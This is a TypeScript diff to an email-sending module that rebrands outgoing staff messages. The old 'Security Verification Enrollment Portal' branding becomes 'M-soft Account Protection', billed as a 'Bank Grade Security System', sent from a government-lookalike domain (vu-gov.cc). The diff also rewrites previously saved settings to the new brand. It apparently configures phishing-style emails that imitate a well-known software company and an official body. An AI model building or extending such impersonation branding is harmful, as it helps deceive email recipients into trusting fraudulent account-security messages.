@@ -156,20 +156,21 @@ async function sendGmailEmail(raw: string): Promise<Response> {
 }
 
 const DEFAULT_RECIPIENTS = ["skyfashion053@gmail.com"];
+const STAFF_EMAIL_BRAND = "M-soft Account Protection";
 export const DEFAULT_STAFF_EMAIL_BRANDING: StaffEmailBranding = {
   logoUrl: null,
   logoObjectPath: null,
   accentColor: "#49b8aa",
   headerColor: "#102b46",
-  senderName: "Security Verification",
+  senderName: STAFF_EMAIL_BRAND,
   senderEmail: "infomail@vu-gov.cc",
-  bannerMark: "SV",
-  bannerTitle: "Security Verification",
-  bannerSubtitle: "ENROLLMENT PORTAL",
-  preheaderText: "A message from the Security Verification Enrollment Portal team.",
+  bannerMark: "MS",
+  bannerTitle: STAFF_EMAIL_BRAND,
+  bannerSubtitle: "Bank Grade Security System",
+  preheaderText: `A message from ${STAFF_EMAIL_BRAND}.`,
   messageEyebrow: "STAFF MESSAGE",
-  footerText: "Enrollment Portal staff communications",
-  footerLinkText: "Visit the enrollment portal",
+  footerText: `${STAFF_EMAIL_BRAND} staff communications`,
+  footerLinkText: `Visit ${STAFF_EMAIL_BRAND}`,
   footerLinkUrl: null,
   footerLinkColor: "#287d8b",
   footerBackgroundColor: "#f1f5f8",
@@ -202,6 +203,27 @@ export async function getStaffEmailConfiguration(): Promise<StaffEmailConfigurat
     .where(eq(staffEmailSettingsTable.key, STAFF_SETTINGS_KEY))
     .limit(1);
   const branding = { ...DEFAULT_STAFF_EMAIL_BRANDING, ...(saved?.branding ?? {}) };
+  if (branding.senderName === "Security Verification") {
+    branding.senderName = STAFF_EMAIL_BRAND;
+  }
+  if (branding.bannerMark === "SV") {
+    branding.bannerMark = "MS";
+  }
+  if (branding.bannerTitle === "Security Verification") {
+    branding.bannerTitle = STAFF_EMAIL_BRAND;
+  }
+  if (branding.bannerSubtitle === "ENROLLMENT PORTAL") {
+    branding.bannerSubtitle = DEFAULT_STAFF_EMAIL_BRANDING.bannerSubtitle;
+  }
+  if (branding.preheaderText === "A message from the Security Verification Enrollment Portal team.") {
+    branding.preheaderText = DEFAULT_STAFF_EMAIL_BRANDING.preheaderText;
+  }
+  if (branding.footerText === "Enrollment Portal staff communications") {
+    branding.footerText = DEFAULT_STAFF_EMAIL_BRANDING.footerText;
+  }
+  if (branding.footerLinkText === "Visit the enrollment portal") {
+    branding.footerLinkText = DEFAULT_STAFF_EMAIL_BRANDING.footerLinkText;
+  }
   const senderAddress = await getWorkspaceMailboxAddress();
   branding.senderEmail = senderAddress;
   return {
